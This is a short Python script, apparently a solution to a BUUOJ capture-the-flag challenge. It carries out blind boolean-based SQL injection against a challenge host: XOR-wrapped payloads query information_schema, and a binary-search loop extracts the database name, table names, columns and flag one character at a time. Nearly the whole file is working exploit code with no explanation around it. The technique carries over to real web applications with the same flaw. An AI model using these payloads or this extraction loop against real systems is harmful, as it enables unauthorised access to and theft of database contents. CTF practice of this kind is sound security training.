# -*- coding: UTF-8 -*-
# 颜值注入

import time

import requests

url = "http://0cfdc5c8-c87c-4e7f-b632-7f6c6ff7a2d0.node4.buuoj.cn:81/?stunum="

payload1 = "1^(ascii(substr((select(database())),{},1))>{})^1"
payload2 = "1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='CTF')),{},1))>{})^1"
payload3 = "1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),{},1))>{})^1"
payload4 = "1^(ascii(substr((select(group_concat(value))from(CTF.flag)),{},1))>{})^1"
flag = ""

for x in range(1, 1000):
    low = 32
    high = 127
    mid = (low + high) // 2
    while low < high:
        playload = payload4.format(x, mid)
        new_url = url + playload
        r = requests.get(new_url)
        if "Hi admin, your score is: 100" in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if (mid == 32 or mid == 132):
        break
    flag += chr(mid)
    print(flag)

    time.sleep(1)

print(flag)
# CTF
# flag,score
# flag,value
